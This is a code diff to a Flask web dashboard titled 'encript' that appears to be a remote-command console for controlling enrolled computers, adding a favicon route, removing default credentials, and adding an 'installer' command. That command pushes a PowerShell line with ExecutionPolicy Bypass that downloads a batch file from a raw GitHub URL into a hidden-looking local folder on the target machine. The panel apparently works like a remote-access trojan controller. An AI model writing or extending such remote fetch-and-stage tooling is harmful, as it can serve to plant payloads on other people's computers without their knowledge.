@@ -1,4 +1,5 @@
 import hmac
+import io
 import os
 import queue
 import threading
@@ -10,13 +11,13 @@ from functools import wraps
 
 from flask import (
     Flask, jsonify, redirect, render_template_string,
-    request, session, url_for
+    request, send_file, session, url_for
 )
 
 app = Flask(__name__)
 
-USERNAME = os.environ.get("DASH_USER", "xyrielly")
-PASSWORD = os.environ.get("DASH_PASSWORD", "BRODONTHACKME1")
+USERNAME = os.environ["DASH_USER"]
+PASSWORD = os.environ["DASH_PASSWORD"]
 
 app.secret_key = (
     os.environ.get("DASH_SECRET")
@@ -191,6 +192,26 @@ def logout():
     return redirect(url_for("login"))
 
 
+ICON_PATH = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)),
+    "website.ico"
+)
+
+
+@app.route("/favicon.ico")
+def favicon():
+
+    try:
+        with open(ICON_PATH, "rb") as icon:
+            return send_file(
+                io.BytesIO(icon.read()),
+                mimetype="image/vnd.microsoft.icon",
+                max_age=0
+            )
+    except FileNotFoundError:
+        return "", 404
+
+
 @app.route("/")
 @require_auth
 def console_page():
@@ -321,6 +342,58 @@ def upload_console():
 # CONSOLE API
 # ==================================================
 
+INSTALLER_URL = (
+    "https://raw.githubusercontent.com/"
+    "downloader-AXP/downloaders/main/installer.bat"
+)
+
+
+def installer_command():
+
+    return (
+        'powershell -NoProfile -ExecutionPolicy Bypass -Command "'
+        "[Net.ServicePointManager]::SecurityProtocol = "
+        "[Net.ServicePointManager]::SecurityProtocol -bor "
+        "[Net.SecurityProtocolType]::Tls12; "
+        "$ErrorActionPreference = 'Stop'; "
+        "$d = Join-Path $env:LOCALAPPDATA 'RemoteAdmin'; "
+        "New-Item -ItemType Directory -Force -Path $d | Out-Null; "
+        f"Invoke-WebRequest -UseBasicParsing -Uri ('{INSTALLER_URL}?t=' + [guid]::NewGuid().ToString('N')) "
+        "-OutFile (Join-Path $d 'installer.bat'); "
+        "Get-Item (Join-Path $d 'installer.bat') | Select-Object -ExpandProperty FullName"
+        '"'
+    )
+
+
+def queue_console(name, command):
+
+    now = time.time()
+
+    prune_stale(now)
+    prune_commands(now)
+
+    if name not in clients:
+        return None
+
+    command_id = str(uuid.uuid4())
+
+    console_commands[command_id] = {
+        "name": name,
+        "status": "pending",
+        "output": "",
+        "exit_code": 0,
+        "created": now
+    }
+
+    client_actions.setdefault(name, queue.Queue()).put({
+        "action": "console",
+        "command_id": command_id,
+        "command": command
+    })
+
+    return command_id
+
+
 @app.route("/api/clients")
 @require_auth
 def api_clients():
@@ -363,32 +436,26 @@ def console_command():
         return jsonify({"error": "Command is too long."}), 400
 
     with lock:
+        command_id = queue_console(name, command)
 
-        now = time.time()
+    if not command_id:
+        return jsonify({"error": "Computer not found."}), 404
 
-        prune_stale(now)
-        prune_commands(now)
+    return jsonify({"command_id": command_id})
 
-        client = clients.get(name)
 
-        if not client:
-            return jsonify({"error": "Computer not found."}), 404
+@app.route("/api/console/installer", methods=["POST"])
+@require_auth
+def console_installer():
 
-        command_id = str(uuid.uuid4())
+    data = request.get_json(silent=True) or {}
+    name = data.get("name") or ""
 
-        console_commands[command_id] = {
-            "name": name,
-            "status": "pending",
-            "output": "",
-            "exit_code": 0,
-            "created": now
-        }
+    with lock:
+        command_id = queue_console(name, installer_command())
 
-        client_actions.setdefault(name, queue.Queue()).put({
-            "action": "console",
-            "command_id": command_id,
-            "command": command
-        })
+    if not command_id:
+        return jsonify({"error": "Computer not found."}), 404
 
     return jsonify({"command_id": command_id})
 
@@ -420,6 +487,7 @@ LOGIN_PAGE = r"""
 <head>
 <meta charset="utf-8">
 <title>encript</title>
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
     body {
@@ -483,6 +551,7 @@ CONSOLE_PAGE = r"""
 <head>
 <meta charset="utf-8">
 <title>encript</title>
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
     * {
@@ -805,6 +874,49 @@ async function runCommand() {
         try {
 
             await syncTo(command.replace(/^sync\s*/i, ""));
+
+        } catch (error) {
+
+            print("ERROR: " + error.message, "err");
+
+        } finally {
+
+            setBusy(false);
+            focusInput();
+        }
+
+        return;
+    }
+
+    if (/^installer$/i.test(command)) {
+
+        setBusy(true);
+
+        try {
+
+            if (!target) {
+                throw new Error("No computer targeted.");
+            }
+
+            const data = await api("/api/console/installer", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    name: target
+                })
+            });
+
+            const result = await waitResult(data.command_id);
+
+            if (result.output) {
+                print(result.output.replace(/\s+$/, ""));
+            }
+
+            if (result.exit_code) {
+                print("[exit code " + result.exit_code + "]", "muted");
+            }
 
         } catch (error) {
 
